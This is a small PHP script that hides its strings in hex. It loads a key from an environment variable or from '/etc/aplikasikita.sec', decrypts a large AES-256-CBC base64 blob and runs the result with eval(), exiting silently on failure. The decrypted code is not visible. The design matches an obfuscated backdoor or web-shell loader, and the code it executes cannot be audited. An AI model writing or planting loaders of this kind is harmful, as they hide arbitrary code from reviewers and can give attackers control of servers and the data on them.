<?php
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');
$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);
if(!$k)exit;
$i=base64_decode('zwE8twwjdAys8CKELjLMtg==');
$c=base64_decode(
'SaLSQbIUzYbS/UFaqHyLEb2HEREySWjoBtv1qYbd35f04SRxtKuM8OJYUuDEEliNK54Bk5+qaqQw' .
'+4NwwXi1dGcSqWlGp0UQxSfV+OXlvUHbDsnE61uriH9IlRLGhrcpzwG3xHHj2HUp/3wzOvwBv/CS' .
'xwY44QA4KypJVbWV8CXtKq2/bALPQeLxTPeBruzzRIat/B2Vqa52tFjNKqCyOU6we/XWDjHfqPiJ' .
'gLPGjRTjpZac2vnpBzrYruVmPsR7jvdW/hv8UwaN1yP4BiUXMmJyLiDiDayDdruYCxPXeyVkBSoN' .
'zUYO7KbNSWywOgFewZ0jCg6G4BwPcphu9Poi8FbADJRR2M+hGzscG5iLDAa8xaVgM8zV3ma+YWLZ' .
'IJRz3TQ8VTzBjneqBIntsgOCu3vI5eiddvJ4gm6bsbdzUO1EZrBcXMhEcgM+uy/x39ZRIcGceOJK' .
'yM+cO/F8NokMTSrJmo2LDpqcQS6DRnKQOj44Ae3+9ugZtGjG6P3fMRl5vjE4AgP/7J9pKkuEDPah' .
'z/L3Wt9XoMOPz6fnvdT0TnLEpNQ1ufISr/P9jTx3OrRhswsEPccAQgvGBjb2J1jPx/7GLpxo8+7w' .
'Pi85UhgWEshN0pt8oqnPExU45XCWparGJZvpDbdO81Ij5aZVpR+acalC/54U5t23OUcTLmPDw69w' .
'5SmGzEp9nqxM31x3QzIKpM0HJSLP9tA3YjwtReRXRbGsqy9b6ZfZDFM4jOp44Ca5+tcODu7pyYp9' .
'B77LqMVK1NJ9avl2Vf6R4zzWXEaAB0Uw/za1AsYFcq5t8m+riLKUrvms7XMA6yRxMsrmmXc5QdoS' .
'vispCmqfaZ/gwsqXzuF4PyPdENdvBZuKgldHFItl1pftnb8OpqmLM71y7i6yPfJ0lojhWB7wpJNG' .
'/C5bBGLdUO5o7p7EPTFMUd4NE2QKdT1Ulx7WZRLe7rhb8P9HwhDzHqLUd8s+pLwUIoi0kDCukCAo' .
'Tu7gHibbcF/8kByqtOM5W9KZGvzOYkrPHlI+Okn7UUSFv8IrESg6zzs/Rj1VytnTH6+vIlQyMhyq' .
'8aJX5cNSJ5+V465l4BK8kLI9f6NuvlPl6EoU9E3PngRTwrGmfPXYcgEfiOBACUEJ+Z3dqhrF/UoN' .
'LKHEaobIN47C7FOqlV2s9a0WTnPPvvu4YXrSP5J8ldk89szMuBvwNL7tuJmp1nNmomyU4u5S8r9l' .
'G0WtV6naxeSoRYVM0RI2hLsDLDAWd1PkH82w51RAqHdiVZ5kuKLBVurTjvJCDNeF+VhMfajHCQNp' .
'exwIfOYpGwa5wpqbxRQy0lJXZwwgqLqB1z7/ArdrB1DJxWX2efSGwWM+UU772Vz1kr0dmqNinA=='
);
$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);
if($d===false)exit;
eval($d);
